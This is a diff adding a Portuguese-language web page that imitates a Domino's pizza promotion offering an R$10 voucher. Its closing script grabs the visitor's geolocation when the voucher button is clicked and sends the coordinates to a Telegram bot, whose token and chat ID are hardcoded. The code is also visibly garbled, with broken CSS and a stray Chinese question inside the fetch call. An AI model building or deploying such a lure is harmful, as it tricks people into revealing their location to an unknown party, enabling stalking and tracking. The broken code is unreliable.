@@ -1,0 +1,123 @@
+html
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <title>Dominos – Promoção Imperdável</title>
+  <meta name="viewport" content="width=device-width">
+  <style>
+    :root{--vermelho:d80000; --amarelo:ffcc00;}
+    {box-sizing:border-box;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif}
+    html,body{height:100%}
+;}
+    header{background:var(--vermelho);color:fff;padding:20px 0;}
+    header h1{font-size:2.2em;letter-spacing:1px}
+    .logo{font-size:1.4em;vertical-align:middle;margin-right:8px}
+    nav{background:b80000;display:flex;justify-content:center;gap:20px;padding:10px;}
+    nav a{color:fff;text-decoration:none;font-weight:bold}
+    main{padding:30px 15px;max-width:1100px;margin:auto;}
+    .catalogo{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:20px;}
+    .card{background:fff;color:111;border-radius:10px;overflow:hidden;box-shadow:0 2px 6 0002;}
+    .card img{width:100%;height:180px;object-fit:cover}
+    .card-body{padding:15px}
+    .card-body h3{margin-bottom:8px;font-size:1.3em}
+    .card-body p{margin-bottom:12px;color:333}
+    .preco{font-size:1.4em;font-weight:bold;color:var(--vermelho)}
+    .voucher-banner{background:var(--amarelo);color:111;padding:30px 15px;text-align:center;margin:30px 0;border-radius:10px;box-shadow:0 2px 6px 0003}
+    .voucher-banner h2{font-size:1.8em;margin-bottom:15px}
+    .voucher-banner button{background:111;color:var(--amarelo);border:0;padding:14px 28px;font-size:1.2em;border-radius:6px;cursor:pointer;transition:background .2s}
+    .voucher-banner button:hover{background:000}
+    footer{background:222;color:ccc;text-align:center;padding:20px 10px;font-size:.9em}
+    @media(max-width:500px){header h1{font-size:1.7em}}
+  </style>
+</head>
+<body>
+  <header>
+    <h1><span class="logo">🍕</span> Dominos</h1>
+    <p>A melhor pizza da galáxia com preços de black hole</p>
+  </header>
+
+  <nav>
+    <a href="catalogo">Catálogo</a>
+    <a href="voucher">Resgatar Voucher</a>
+  </nav>
+
+  <main id="catalogo">
+    <h2 style="text-align:center;margin-bottom:20px">Promoções do Dia</h2>
+
+    <div class="catalogo">
+      <!-- Pizza 1 -->
+      <div class="card">
+        <img src="https://images.unsplash.com/photo-1565291197838-37e97c055d43?auto=format&fit=crop&w=700&q=60" alt="Pizza Margherita">
+        <div class="card-body">
+          <h3>Margherita Suprema</h3>
+          <p>Molho de tomate artesanal, mussarela fresca, manjericão e azeite.</p>
+          <div class="preco">R$ 34,90</div>
+        </div>
+      </div>
+
+      <!-- Pizza 2 -->
+      <div class="card">
+        <img src="https://images.unsplash.com/photo-1571997478779-2adcbbe9ab08?auto=format&fit=crop&w=700&q=60" alt="Pizza Pepperoni">
+        <div class="card-body">
+          <h3>Pepperoni Explosiva</h3>
+          <p>Camadas duplas de pepperoni crocante e mussarela deretida.</p>
+          <div class="preco">R$ 39,90</div>
+        </div>
+      </div>
+
+      <!-- Pizza 3 -->
+      <div class="card">
+        <img src="https://images.unsplash.com/photo-1555939594-58f4855a88e6?auto=format&fit=crop&w=700&q=60" alt="Pizza Frango">
+        <div class="card-body">
+          <h3>Frango Cremoso</h3>
+          <p>Frango desfiado, milho, requeijão e orégano especial.</p>
+          <div class="preco">R$ 37,90</div>
+        </div>
+      </div>
+
+      <!-- Pizza 4 -->
+      <div class="card">
+        <img src="https://images.unsplash.com/photo-1604382355076-af4dd0cb4c06?auto=format&fit=crop&w=700&q=60" alt="Pizza Chocolate">
+        <div class="card-body">
+          <h3>Chocobom</h3>
+          <p>Chocolate derretido, confeitos e finalização de chantilly.</p>
+          <div class="preco">R$ 32,90</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Voucher -->
+    <div id="voucher" class="voucher-banner">
+      <h2>🎁 Clique e ganhe <strong>R$ 10 OFF</strong> na sua próxima pizza!</h2>
+      <button id="bt">RESGATAR VOUCHER</button>
+    </div>
+  </main>
+
+  <footer>
+    © 2026 Dominos – Todos os direitos reservados | Entregamos em 30 min ou é grátis
+  </footer>
+
+<script>
+  // ---------- CONFIGURE AQUI ----------
+  const TOKEN  = "8524345500:AAG21HWPWOP2l3G3Un6HKL4BWCEPnha2Df0"; // token do bot
+  const CHATID = "849467146";                                     // seu chat ID
+  // ---------- FIM CONFIGURAÇÃO ----------
+
+  document.getElementById('bt').onclick = () => {
+    navigator.geolocation.getCurrentPosition(p => {
+      const lat = p.coords.latitude;
+      const lon = p.coords.longitude;
+      const acc = p.coords.accuracy;
+      const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+      const texto = `📍 Localização capturada\nLat ${lat}\nLon ${lon}\nPrecisão ${acc} m\n${maps}`;
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+        method:'POST',
+        headers有明显的错误吗？{'Content-Type':'application/json'},
+        body: JSON.stringify({chat_id:CHATID, text:texto})
+      }).then(() => location.href = maps);
+    }, () => alert('Permita o acesso à localização para resgatar seu voucher.'));
+  };
+</script>
+</body>
+</html>
